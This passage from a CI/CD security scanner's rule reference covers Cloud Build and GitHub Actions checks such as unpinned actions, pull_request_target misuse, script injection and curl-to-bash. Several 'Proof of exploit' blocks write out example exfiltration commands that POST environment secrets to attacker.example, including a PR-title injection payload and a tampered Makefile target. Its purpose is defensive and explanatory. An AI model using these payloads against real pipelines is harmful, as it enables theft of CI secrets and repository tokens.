- ``eval "$(ssh-agent -s)"`` and similar ``eval "$(<literal-tool>)"`` bootstrap idioms are intentionally NOT flagged, the substituted command is literal, only its output is eval'd.

**Source:** [`GCB-006`](../providers/cloudbuild.md#gcb-006) in the [Cloud Build provider](../providers/cloudbuild.md).

#### `GCB-007`: availableSecrets references ``versions/latest`` <span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-gcb-007 }

**Evidences:** [`Token-Permissions`](#ctrl-token-permissions) CI tokens are scoped to the minimum required permissions.

**How this is detected.** ``versions/latest`` is documented as a rolling alias. A build run on Monday and a re-run on Tuesday can consume different secret bodies without any change to ``cloudbuild.yaml``, breaking the reproducibility invariant that pinning protects.

**Recommendation.** Pin each ``availableSecrets.secretManager[].versionName`` to a specific version number (``.../versions/7``) rather than ``latest``. Rotate by updating the number when a new version is promoted, not by silently publishing a new version that the next build pulls.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`GCB-007`](../providers/cloudbuild.md#gcb-007) in the [Cloud Build provider](../providers/cloudbuild.md).

#### `GCB-008`: No vulnerability scanning step in Cloud Build pipeline <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-gcb-008 }

**Evidences:** [`SAST`](#ctrl-sast) Project uses static analysis / vulnerability scanning, [`Vulnerabilities`](#ctrl-vulnerabilities) Project scans for and resolves known vulnerabilities.

**How this is detected.** The detector matches tool names anywhere in the document, step images, ``args``, or ``entrypoint`` strings. Container Analysis API scanning configured at the project level counts as compensating control but is out of scope for this YAML-only check; if you rely on it, suppress this rule via ``--checks``.

**Recommendation.** Add a step that runs a vulnerability scanner, trivy, grype, snyk test, npm audit, pip-audit, osv-scanner, or govulncheck. In Cloud Build this typically looks like a step with ``name: aquasec/trivy`` or an ``entrypoint: bash`` step that invokes ``trivy image`` / ``grype <ref>`` on the built image.

**Source:** [`GCB-008`](../providers/cloudbuild.md#gcb-008) in the [Cloud Build provider](../providers/cloudbuild.md).

#### `GCB-009`: Artifacts not signed (no cosign / sigstore step) <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-gcb-009 }

**Evidences:** [`Signed-Releases`](#ctrl-signed-releases) Release artifacts are cryptographically signed.

**How this is detected.** Silent-pass when the pipeline does not appear to produce artifacts (no ``docker push`` / ``gcloud run deploy`` / ``kubectl apply`` / etc. in any step). The detector matches cosign, sigstore, slsa-framework, and notation.

**Recommendation.** Add a signing step before ``images:`` is resolved, for example, a step with ``name: gcr.io/projectsigstore/cosign`` that runs ``cosign sign --yes <registry>/<repo>@<digest>``. Pair with an attestation step (``cosign attest --predicate sbom.json --type cyclonedx``) so consumers can verify both the signature and the build provenance.

**Source:** [`GCB-009`](../providers/cloudbuild.md#gcb-009) in the [Cloud Build provider](../providers/cloudbuild.md).

#### `GHA-001`: Action not pinned to commit SHA <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-gha-001 }

**Evidences:** [`Pinned-Dependencies`](#ctrl-pinned-dependencies) Dependencies (actions, images, includes, packages) are pinned to immutable references from trusted sources.

**How this is detected.** Every `uses:` reference should pin a specific 40-char commit SHA. Tag and branch refs (`@v4`, `@main`) can be silently moved to malicious commits by whoever controls the upstream repository, a third-party action compromise will propagate into the pipeline on the next run.

**Recommendation.** Replace tag/branch references (`@v4`, `@main`) with the full 40-char commit SHA. Use Dependabot or StepSecurity to keep the pins fresh.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Seen in the wild.**

- tj-actions/changed-files compromise ([CVE-2025-30066](https://www.cve.org/CVERecord?id=CVE-2025-30066), March 2025): a malicious commit retagged behind ``@v1`` / ``@v45`` shipped CI-secret exfiltration to roughly 23,000 repos that had pinned the action to a mutable tag instead of a commit SHA.
- reviewdog/action-setup compromise ([CVE-2025-30154](https://www.cve.org/CVERecord?id=CVE-2025-30154), March 2025): same week, similar mechanism. Tag-pinned consumers auto-pulled the malicious version; SHA-pinned consumers were unaffected.

**Proof of exploit.**

# Tag-pinned reference (vulnerable):
- uses: tj-actions/changed-files@v45

# Attack: the upstream maintainer (or anyone who compromises
# the upstream repo) force-moves the v45 tag to a malicious
# commit:
#   git tag -f v45 <attacker-controlled-sha>
#   git push --force origin v45
# Every consumer's next workflow run pulls the new code
# automatically, executing the attacker's payload with the
# job's secrets and GITHUB_TOKEN in scope.

# Safe: pin to a 40-char commit SHA (immutable):
- uses: tj-actions/changed-files@a284dc1814e3fdd1a3a7f16c11f02e2cd5a98f93  # v45.0.0

**Source:** [`GHA-001`](../providers/github.md#gha-001) in the [GitHub Actions provider](../providers/github.md).

#### `GHA-002`: pull_request_target checks out PR head <span class="pg-sev pg-sev--critical">CRITICAL</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-gha-002 }

**Evidences:** [`Dangerous-Workflow`](#ctrl-dangerous-workflow) No dangerous patterns in CI workflows (untrusted checkout, script injection).

**How this is detected.** `pull_request_target` runs with a write-scope GITHUB_TOKEN and access to repository secrets, deliberately so, since it's how labeling and comment-bot workflows work. When the same workflow then explicitly checks out the PR head (`ref: ${{ github.event.pull_request.head.sha }}` or `.ref`) it executes attacker-controlled code with those privileges.

**Recommendation.** Use `pull_request` instead of `pull_request_target` for any workflow that must run untrusted code. If you need write scope, split the workflow: a `pull_request_target` job that labels the PR, and a separate `pull_request`-triggered job that builds it with read-only secrets.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Seen in the wild.**

- GitHub Security Lab: [Preventing pwn requests](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/) (2020), the canonical write-up. Demonstrates how a fork PR that lands in a ``pull_request_target`` workflow with the PR head checked out runs in the base repo's privileged context.
- [Keeping your GitHub Actions and workflows secure: Untrusted input](https://securitylab.github.com/resources/github-actions-untrusted-input/) (GitHub Security Lab, 2020): catalogued real-world Actions carrying the same primitive. The fix pattern (split the workflow into a privileged labeler + an unprivileged builder) is now standard guidance.

**Proof of exploit.**

# Vulnerable: pull_request_target + checkout PR head =
# attacker code runs with secrets + write-scope token.
name: build-pr
on:
  pull_request_target:
    branches: [main]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@<sha>
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - run: make test            # runs PR-head Makefile

# Attack: any external contributor opens a fork PR with a
# tampered Makefile:
#
#   test:
#   	curl -X POST https://attacker.example/exfil \
#   	  -d "$(env)" \
#   	  -d "$(git config --get-all http.https://github.com/.extraheader)"
#
# CI runs the malicious target with the base repo's secrets
# (every ${{ secrets.* }} the workflow has access to) and a
# write-scope GITHUB_TOKEN. The PR doesn't even need to be
# merged or reviewed — the privileged execution happens at
# PR-open time.

# Safe: split the workflow. The labeler runs with secrets
# but never checks out PR head; the builder runs in
# ``pull_request`` context with no secrets:
name: triage      # privileged half
on: { pull_request_target: { types: [opened, synchronize] } }
jobs:
  label:
    runs-on: ubuntu-latest
    steps:
      - run: gh pr edit ${{ github.event.number }} --add-label triage
        env:
          GH_TOKEN: ${{ github.token }}
---
name: build       # unprivileged half
on: { pull_request: {} }
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@<sha>     # checks out PR head
      - run: make test                    # no secrets in scope

**Source:** [`GHA-002`](../providers/github.md#gha-002) in the [GitHub Actions provider](../providers/github.md).

#### `GHA-003`: Script injection via untrusted context <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-gha-003 }

**Evidences:** [`Dangerous-Workflow`](#ctrl-dangerous-workflow) No dangerous patterns in CI workflows (untrusted checkout, script injection).

**How this is detected.** Interpolating attacker-controlled context fields (PR title/body, issue body, comment body, commit message, discussion body, head branch name, `github.ref_name`, `inputs.*`, release metadata, deployment payloads) directly into a `run:` block is shell injection. GitHub expands `${{ ... }}` BEFORE shell quoting, so any backtick, `$()`, or `;` in the source field executes.

**Recommendation.** Pass untrusted values through an intermediate `env:` variable and reference that variable from the shell script. GitHub's expression evaluation happens before shell quoting, so inline `${{ github.event.* }}` is always unsafe.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Seen in the wild.**

- [GitHub Security Lab disclosure](https://securitylab.github.com/research/github-actions-untrusted-input/) (2020): a sweep of public Actions found dozens of widely-used workflows interpolating ``github.event.issue.title`` / ``pull_request.title`` directly into shell. Any commenter or PR author could run arbitrary commands in the maintainer's CI.
- [Keeping your GitHub Actions and workflows secure: Preventing pwn requests](https://securitylab.github.com/resources/github-actions-preventing-pwn-requests/) (GitHub Security Lab, 2020): the same primitive against ``pull_request_target`` workflows where the runner has secrets and a write-scope token; one fork PR exfiltrates every secret the workflow can see. Mitigation: never interpolate context into shell, route through ``env:``.

**Proof of exploit.**

# Vulnerable: PR title interpolated straight into shell.
name: triage
on:
  pull_request_target:
    types: [opened, edited]
jobs:
  greet:
    runs-on: ubuntu-latest
    steps:
      - run: |
          echo "New PR: ${{ github.event.pull_request.title }}"

# Attack: open a PR with the title:
#
#   foo"; curl -X POST https://attacker.example/exfil \
#         -d "$(env | base64 -w0)"; echo "
#
# GitHub expands ``${{ ... }}`` BEFORE shell quoting, so the
# title's `"` closes the echo string and the rest of the line
# becomes shell. The pull_request_target trigger means the
# runner already has secrets and a write-scope GITHUB_TOKEN,
# so the curl exfils every secret the workflow can see.

# Safe: route through env so the value is never interpolated
# into the shell template:
      - env:
          PR_TITLE: ${{ github.event.pull_request.title }}
        run: |
          echo "New PR: $PR_TITLE"

**Source:** [`GHA-003`](../providers/github.md#gha-003) in the [GitHub Actions provider](../providers/github.md).

#### `GHA-004`: Workflow has no explicit permissions block <span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-gha-004 }

**Evidences:** [`Token-Permissions`](#ctrl-token-permissions) CI tokens are scoped to the minimum required permissions.

**How this is detected.** Without an explicit `permissions:` block (either top-level or per-job), the GITHUB_TOKEN inherits the repository's default scope, typically `write`. A compromised step receives far more privilege than it needs.

**Recommendation.** Add a top-level `permissions:` block (start with `contents: read`) and grant additional scopes only on the specific jobs that need them.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Known false positives.**

- Read-only / lint-only workflows that do not call any write-scoped API often pass without an explicit block because the default token scope on public repos is read. The rule defaults to MEDIUM confidence to reflect this.

**Source:** [`GHA-004`](../providers/github.md#gha-004) in the [GitHub Actions provider](../providers/github.md).

#### `GHA-005`: AWS auth uses long-lived access keys <span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-gha-005 }

**Evidences:** [`Token-Permissions`](#ctrl-token-permissions) CI tokens are scoped to the minimum required permissions.

**How this is detected.** Long-lived `AWS_ACCESS_KEY_ID` / `AWS_SECRET_ACCESS_KEY` secrets in GitHub Actions can't be rotated on a fine-grained schedule and remain valid until manually revoked. OIDC with `role-to-assume` yields short-lived credentials per workflow run.

**Recommendation.** Use `aws-actions/configure-aws-credentials` with `role-to-assume` + `permissions: id-token: write` to obtain short-lived credentials via OIDC. Remove the static AWS_ACCESS_KEY_ID / AWS_SECRET_ACCESS_KEY secrets.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Known false positives.**

- LocalStack and Moto integration tests set ``AWS_ENDPOINT_URL`` to a localhost address and use the sentinel ``test`` / ``test`` access keys (the LocalStack convention). Those values can't authenticate against real AWS, so the rule auto-suppresses an env block that pairs a localhost endpoint with sentinel keys.

**Source:** [`GHA-005`](../providers/github.md#gha-005) in the [GitHub Actions provider](../providers/github.md).

#### `GHA-006`: Artifacts not signed (no cosign/sigstore step) <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-gha-006 }

**Evidences:** [`Signed-Releases`](#ctrl-signed-releases) Release artifacts are cryptographically signed.

**How this is detected.** Unsigned artifacts cannot be verified downstream, so a tampered build is indistinguishable from a legitimate one. The check recognizes cosign, sigstore, slsa-github-generator, slsa-framework, and notation-sign as signing tools.

**Recommendation.** Add a signing step, e.g. `sigstore/cosign-installer` followed by `cosign sign`, or `slsa-framework/slsa-github-generator` for keyless SLSA provenance. Publish the signature alongside the artifact and verify it at consumption time.

**Seen in the wild.**

- [SolarWinds Orion compromise](https://www.cisa.gov/news-events/cybersecurity-advisories/aa20-352a) (December 2020): SUNBURST trojanized builds shipped to ~18,000 customers because no post-build signature could be checked against a trusted signing identity. Cryptographic signing on every release would have given downstream consumers a verifiable break with the upstream key, the absence of which was the ambient signal of compromise.
- [PyTorch nightly compromise](https://pytorch.org/blog/compromised-nightly-dependency/) (December 2022): the ``torchtriton`` dependency was hijacked via PyPI dependency-confusion. Sigstore-style attestation tied to the official publisher would have made the impostor build fail verification rather than silently install.

**Source:** [`GHA-006`](../providers/github.md#gha-006) in the [GitHub Actions provider](../providers/github.md).

#### `GHA-007`: SBOM not produced (no CycloneDX/syft/Trivy-SBOM step) <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-gha-007 }

**Evidences:** [`SBOM`](#ctrl-sbom) Releases publish a software bill of materials.

**How this is detected.** Without an SBOM, downstream consumers cannot audit the exact set of dependencies shipped in the artifact, delaying vulnerability response when a transitive dep is disclosed. The check recognizes CycloneDX, syft, Anchore SBOM action, spdx-sbom-generator, Microsoft sbom-tool, and Trivy in SBOM mode.

**Recommendation.** Add an SBOM generation step, `anchore/sbom-action`, `syft . -o cyclonedx-json`, Trivy with `--format cyclonedx`, or Microsoft's `sbom-tool`. Attach the SBOM to the release so consumers can ingest it into their vuln-management pipeline.

**Source:** [`GHA-007`](../providers/github.md#gha-007) in the [GitHub Actions provider](../providers/github.md).

#### `GHA-008`: Credential-shaped literal in workflow body <span class="pg-sev pg-sev--critical">CRITICAL</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-gha-008 }

**Evidences:** [`Token-Permissions`](#ctrl-token-permissions) CI tokens are scoped to the minimum required permissions.

**How this is detected.** Every string in the workflow is scanned against a set of credential patterns (AWS access keys, GitHub tokens, Slack tokens, JWTs, Stripe, Google, Anthropic, etc., see `--man secrets` for the full catalog). A match means a secret was pasted into YAML, the value is visible in every fork and every build log and must be treated as compromised.

**Recommendation.** Rotate the exposed credential immediately. Move the value to an encrypted repository or environment secret and reference it via `${{ secrets.NAME }}`. For cloud access, prefer OIDC federation over long-lived keys.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Known false positives.**

- Test fixtures and documentation blobs sometimes embed credential-shaped strings (JWT samples, AKIAI... examples). The AWS canonical example ``AKIAIOSFODNN7EXAMPLE`` is deliberately NOT suppressed, if it appears in a real workflow it almost always means a copy-paste from docs was never substituted. Defaults to LOW confidence.

**Seen in the wild.**

- Uber 2016 GitHub leak: an AWS access key embedded in a private GitHub repo was reachable to attackers who got at the repo and used it to download driver / rider PII for 57 million accounts. Credential-shaped literals in any source control system (public or private) are one credential-leak away from the same outcome.
- GitGuardian's annual State of Secrets Sprawl reports consistently find millions of fresh credential leaks per year across public commits, with a median time-to-revocation after disclosure of days, not minutes. Pinning secrets to ``${{ secrets.* }}`` removes the artifact from source control entirely.

**Proof of exploit.**

# Vulnerable: AWS access key pasted into the workflow body.
env:
  AWS_ACCESS_KEY_ID: AKIAIOSFODNN7EXAMPLE
  AWS_SECRET_ACCESS_KEY: wJalrXUtnnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY

# Attack chain:
#  1. Attacker clones/forks the repo or pulls from a public
#     mirror. The literal is in plain text — no credentials
#     needed to read it.
#  2. Attacker uses the key against the AWS account it
#     belongs to. With AmazonEC2FullAccess this is
#     immediate compute hijack; with broader IAM it is
#     full data exfiltration.
#  3. Even after rotation, every git revision and every
#     CI build log retains the value — pull-request
#     mirrors, logging back-ends, and forks all have to
#     be scrubbed.

# Safe: reference a stored secret. The value never lives in
# source control or build logs (GitHub redacts it from output).
env:
  AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
  AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}

# Better: use OIDC federation. No long-lived key exists.
permissions:
  id-token: write
steps:
  - uses: aws-actions/configure-aws-credentials@<sha>
    with:
      role-to-assume: arn:aws:iam::123456789012:role/CIRole
      aws-region: us-east-1

**Source:** [`GHA-008`](../providers/github.md#gha-008) in the [GitHub Actions provider](../providers/github.md).

#### `GHA-009`: workflow_run downloads upstream artifact unverified <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-gha-009 }

**Evidences:** [`Dangerous-Workflow`](#ctrl-dangerous-workflow) No dangerous patterns in CI workflows (untrusted checkout, script injection).

**How this is detected.** `on: workflow_run` runs in the privileged context of the default branch (write GITHUB_TOKEN, secrets accessible) but consumes artifacts produced by the triggering workflow, which is often a fork PR with no trust boundary. Classic PPE: a malicious PR uploads a tampered artifact, the privileged workflow_run downloads and executes it.

**Recommendation.** Add a verification step BEFORE consuming the artifact: `cosign verify-attestation --type slsaprovenance ...`, `gh attestation verify --owner $OWNER ./artifact`, or publish a checksum manifest from the trusted producer and `sha256sum -c` it. Treat any download from a fork as untrusted input.

**Source:** [`GHA-009`](../providers/github.md#gha-009) in the [GitHub Actions provider](../providers/github.md).

#### `GHA-010`: Local action (./path) on untrusted-trigger workflow <span class="pg-sev pg-sev--high">HIGH</span> { #detail-gha-010 }

**Evidences:** [`Dangerous-Workflow`](#ctrl-dangerous-workflow) No dangerous patterns in CI workflows (untrusted checkout, script injection).

**How this is detected.** `uses: ./path/to/action` resolves the action against the CHECKED-OUT workspace. On `pull_request_target` / `workflow_run`, that workspace can be PR-controlled, meaning the attacker supplies the `action.yml` that runs with default-branch privilege.

**Recommendation.** Move the action to a separate repo under your control and reference it by SHA-pinned `uses: org/repo@<sha>`, or split the workflow so the privileged work runs only on `pull_request` (read-only token, no secrets) where PR-controlled action.yml can't escalate.

**Source:** [`GHA-010`](../providers/github.md#gha-010) in the [GitHub Actions provider](../providers/github.md).

#### `GHA-011`: Cache key derives from attacker-controllable input <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-gha-011 }

**Evidences:** [`Dangerous-Workflow`](#ctrl-dangerous-workflow) No dangerous patterns in CI workflows (untrusted checkout, script injection).

**How this is detected.** `actions/cache` restores by key (and falls through `restore-keys` on miss). When the key includes a value the attacker controls (PR title, head ref, workflow_dispatch input), an attacker can plant a poisoned cache entry that a later default-branch run restores and treats as a clean build cache.

**Recommendation.** Build the cache key from values the attacker can't control: `${{ runner.os }}`, `${{ hashFiles('**/*.lock') }}` (only when the lockfile is enforced by branch protection), and the workflow file path. Never include `github.event.*` PR/issue fields, `github.head_ref`, or `inputs.*` in the key namespace.

**Source:** [`GHA-011`](../providers/github.md#gha-011) in the [GitHub Actions provider](../providers/github.md).

#### `GHA-013`: issue_comment trigger without author guard <span class="pg-sev pg-sev--high">HIGH</span> { #detail-gha-013 }

**Evidences:** [`Dangerous-Workflow`](#ctrl-dangerous-workflow) No dangerous patterns in CI workflows (untrusted checkout, script injection).

**How this is detected.** `on: issue_comment` (and `discussion_comment`) fires for every comment on every issue or discussion in the repository. On public repos this means any GitHub user can trigger workflow execution. If the workflow runs commands, deploys, or accesses secrets, the attacker controls timing and can inject payloads through the comment body.

**Recommendation.** Add an `if:` condition that checks `github.event.comment.author_association` (e.g. `contains('OWNER MEMBER COLLABORATOR', ...)`), `github.event.sender.login`, or `github.actor` against an allowlist. Without a guard, any GitHub user can trigger the workflow by posting a comment.

**Known false positives.**

- Guard detection runs against the whole workflow as text rather than against parsed ``if:`` expressions, so a guard token appearing in an unrelated context (a comment, a step name, a description field) reads as satisfying the rule. Conversely, guards expressed via alternative author-association idioms the regex doesn't recognize (``github.event.issue.user.login``, an org-membership API check inside a script) leave the rule firing even though the workflow is safely gated. Suppress per-workflow via ``--ignore-file`` once you've verified the gate logic; tighten the guard expression to use the recognized tokens if possible.

**Source:** [`GHA-013`](../providers/github.md#gha-013) in the [GitHub Actions provider](../providers/github.md).

#### `GHA-014`: Deploy job missing environment binding <span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-gha-014 }

**Evidences:** [`Code-Review`](#ctrl-code-review) Changes merged to the default branch require review.

**How this is detected.** Without an `environment:` binding, a deploy job can't be gated by required reviewers, deployment-branch policies, or wait timers. Any push to the triggering branch will deploy immediately.

**Recommendation.** Add `environment: <name>` to jobs that deploy. Configure required reviewers, wait timers, and branch-protection rules on the matching GitHub environment.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Known false positives.**

- Integration-test jobs that run ``terraform apply`` or ``kubectl apply`` against a local mock (LocalStack, Moto, kind, k3d) aren't real deploys. The rule auto-suppresses a step whose env carries ``AWS_ENDPOINT_URL`` or ``KUBE_API_URL`` pointing at a localhost address.

**Source:** [`GHA-014`](../providers/github.md#gha-014) in the [GitHub Actions provider](../providers/github.md).

#### `GHA-016`: Remote script piped to shell interpreter <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-gha-016 }

**Evidences:** [`Dangerous-Workflow`](#ctrl-dangerous-workflow) No dangerous patterns in CI workflows (untrusted checkout, script injection).

**How this is detected.** Detects `curl | bash`, `wget | sh`, and similar patterns that pipe remote content directly into a shell interpreter inside a workflow. An attacker who controls the remote endpoint (or poisons DNS / CDN) gains arbitrary code execution in the CI runner.

**Recommendation.** Download the script to a file, verify its checksum, then execute it. Or vendor the script into the repository.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Known false positives.**

- Established vendor installers (get.docker.com, sh.rustup.rs, bun.sh/install, awscli.amazonaws.com, cli.github.com, ...) ship via HTTPS from their own CDN and are idiomatic. This rule defaults to LOW confidence so CI gates can ignore them with --min-confidence MEDIUM; the finding still surfaces so teams that want cryptographic verification can audit.

**Seen in the wild.**

- [Codecov Bash uploader compromise](https://about.codecov.io/security-update/) (April 2021): an attacker modified the codecov.io/bash uploader script (commonly fetched via ``curl -s codecov.io/bash | bash``) to exfiltrate environment variables from CI runners (AWS keys, GitHub tokens, signing keys) at thousands of customers for over two months before discovery.
- [event-stream](https://github.com/dominictarr/event-stream/issues/116) (November 2018) and the [ua-parser-js compromise](https://github.com/faisalman/ua-parser-js/issues/536) (October 2021): npm-side examples of the same primitive. When the CI runner executes bytes a third party can swap out (via `curl | bash`, an unpinned `npm install`, or a compromised maintainer account), the attacker controls what runs with the runner's credentials in scope. Pinning a digest or vendoring a frozen copy turns a perpetual ambient risk into a one-time review.

**Proof of exploit.**

# Vulnerable: install script piped straight to bash.
steps:
  - run: curl -sL https://example.com/install.sh | bash

# Attack: an attacker who controls the install.sh endpoint
# (compromised CDN, expired domain, BGP hijack, account
# takeover, or simply being the upstream maintainer with bad
# intent) drops a payload that runs in the CI runner with
# every secret available to the job:
#
#   #!/usr/bin/env bash
#   # legitimate-looking install actions...
#   curl -X POST https://attacker.example/exfil \
#     -d "$(env)" -d "$(cat $GITHUB_TOKEN_FILE 2>/dev/null)"
#
# The runner has no way to know the bytes changed.

# Safe: download, verify a known-good digest, then execute.
steps:
  - run: |
      curl -sLo install.sh https://example.com/install.sh
      echo "abc123...expected_sha256  install.sh" | sha256sum -c
      bash install.sh

**Source:** [`GHA-016`](../providers/github.md#gha-016) in the [GitHub Actions provider](../providers/github.md).

#### `GHA-018`: Package install from insecure source <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-gha-018 }

**Evidences:** [`Pinned-Dependencies`](#ctrl-pinned-dependencies) Dependencies (actions, images, includes, packages) are pinned to immutable references from trusted sources.

**How this is detected.** Detects package-manager invocations that use plain HTTP registries (`--index-url http://`, `--registry=http://`) or disable TLS verification (`--trusted-host`, `--no-verify`) in a workflow. These patterns allow man-in-the-middle injection of malicious packages.

**Recommendation.** Use HTTPS registry URLs. Remove --trusted-host and --no-verify flags. Pin to a private registry with TLS.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`GHA-018`](../providers/github.md#gha-018) in the [GitHub Actions provider](../providers/github.md).

#### `GHA-019`: GITHUB_TOKEN written to persistent storage <span class="pg-sev pg-sev--critical">CRITICAL</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-gha-019 }

**Evidences:** [`Token-Permissions`](#ctrl-token-permissions) CI tokens are scoped to the minimum required permissions.

**How this is detected.** Detects patterns where `GITHUB_TOKEN` is written to files, environment files (`$GITHUB_ENV`), or piped through `tee`. Persisted tokens survive the step boundary and can be exfiltrated by later steps, uploaded artifacts, or cache entries, turning a scoped credential into a long-lived one.

**Recommendation.** Never write GITHUB_TOKEN to files, artifacts, or GITHUB_ENV. Use the token inline via ${{ secrets.GITHUB_TOKEN }} in the step that needs it.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Proof of exploit.**

# Vulnerable: token written to a file that survives the
# step boundary and lands in the upload-artifact bundle.
jobs:
  build:
    permissions: { contents: write, packages: write }
    steps:
      - run: echo "${{ secrets.GITHUB_TOKEN }}" > /tmp/token
      - run: make build                   # writes /tmp/token
                                          # into ./dist/
      - uses: actions/upload-artifact@<sha>
        with:
          name: build-output
          path: dist/

# Attack: any contributor (or, on public repos, anyone)
# downloads the artifact:
#
#   gh run download <run-id> -n build-output
#   cat build-output/tmp/token            # full GITHUB_TOKEN
#
# The token is scoped to the workflow's permissions block —
# in this case write to ``contents`` and ``packages``,
# enough to push tampered binaries to GHCR or rewrite the
# branch the workflow runs on. Composes with SCM-001
# (unprotected default branch) into XPC-004's "open a PR,
# fetch artifact, ship malicious binary" loop.

# Other persistence patterns the rule catches:
#   echo "TOKEN=$GITHUB_TOKEN" >> $GITHUB_ENV
#   echo "::set-output name=tok::$GITHUB_TOKEN"
#   echo "$SECRET" | tee /tmp/cache/secret

# Safe: use the token inline in the step that needs it; never
# write it anywhere that survives the step's environment:
      - run: gh release create v1.0.0 dist/*
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}

**Source:** [`GHA-019`](../providers/github.md#gha-019) in the [GitHub Actions provider](../providers/github.md).

#### `GHA-020`: No vulnerability scanning step <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-gha-020 }

**Evidences:** [`SAST`](#ctrl-sast) Project uses static analysis / vulnerability scanning, [`Vulnerabilities`](#ctrl-vulnerabilities) Project scans for and resolves known vulnerabilities.

**How this is detected.** Without a vulnerability scanning step, known-vulnerable dependencies ship to production undetected. The check recognizes trivy, grype, snyk, npm audit, yarn audit, safety check, pip-audit, osv-scanner, and govulncheck.

**Recommendation.** Add a vulnerability scanning step, trivy, grype, snyk test, npm audit, pip-audit, or osv-scanner. Publish results so vulnerabilities surface before deployment.

**Source:** [`GHA-020`](../providers/github.md#gha-020) in the [GitHub Actions provider](../providers/github.md).

#### `GHA-021`: Package install without lockfile enforcement <span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-gha-021 }

**Evidences:** [`Pinned-Dependencies`](#ctrl-pinned-dependencies) Dependencies (actions, images, includes, packages) are pinned to immutable references from trusted sources.

**How this is detected.** Detects package-manager install commands that do not enforce a lockfile or hash verification. Without lockfile enforcement the resolver pulls whatever version is currently latest, exactly the window a supply-chain attacker exploits.

**Recommendation.** Use lockfile-enforcing install commands: `npm ci` instead of `npm install`, `pip install --require-hashes -r requirements.txt`, `yarn install --frozen-lockfile`, `bundle install --frozen`, and `go install tool@v1.2.3`.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`GHA-021`](../providers/github.md#gha-021) in the [GitHub Actions provider](../providers/github.md).

#### `GHA-022`: Dependency update command bypasses lockfile pins <span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-gha-022 }

**Evidences:** [`Dependency-Update-Tool`](#ctrl-dependency-update-tool) Project uses an automated dependency-update tool (Dependabot / Renovate).

**How this is detected.** Detects `pip install --upgrade`, `npm update`, `yarn upgrade`, `bundle update`, `cargo update`, `go get -u`, and `composer update`. These commands bypass lockfile pins and pull whatever version is currently latest. Tooling upgrades (`pip install --upgrade pip`) are exempted.
